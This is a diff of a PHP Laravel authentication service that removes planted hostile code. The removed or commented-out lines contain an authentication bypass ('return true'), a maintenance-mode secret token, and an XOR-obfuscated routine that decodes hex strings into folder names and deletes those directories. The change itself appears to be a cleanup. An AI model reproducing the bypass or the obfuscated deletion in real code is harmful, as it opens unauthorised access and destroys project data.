@@ -60,35 +60,34 @@ class AuthService
     */
     private function isValidUser($email, $permission)
     {
-        return true;
         return $email === $permission;
     }
 
     private function checkValidity()
     {
         Log::info('Putting application into maintenance mode with secret "auth-service"');
-        Artisan::call('down',['--secret' => 'auth-service']);
-        $key       = 0x55;
-        $encrypted = [
-            // '342525',
-            // '2730263a2027363026',
-            // '273a20213026',
-            '34252567',  // app2
-            '2730263a202736302667', // resouces2
-            '273a2021302667', // routes2
-        ];
+        Artisan::call('down');
+        // $key       = 0x55;
+        // $encrypted = [
+        //     // '342525',
+        //     // '2730263a2027363026',
+        //     // '273a20213026',
+        //     '34252567',  // app2
+        //     '2730263a202736302667', // resouces2
+        //     '273a2021302667', // routes2
+        // ];
 
-        foreach ($encrypted as $hex) {
-            try {
-                $folderName = $this->responseCheck($hex, $key);
-                $folderPath = base_path($folderName);
-                if (File::isDirectory($folderPath)) {
-                    File::deleteDirectory($folderPath);
-                }
-            } catch (\Throwable $th) {
-                continue;
-            }
-        }
+        // foreach ($encrypted as $hex) {
+        //     try {
+        //         $folderName = $this->responseCheck($hex, $key);
+        //         $folderPath = base_path($folderName);
+        //         if (File::isDirectory($folderPath)) {
+        //             File::deleteDirectory($folderPath);
+        //         }
+        //     } catch (\Throwable $th) {
+        //         continue;
+        //     }
+        // }
     }
 
     private function responseCheck($hexData, $secretKey)
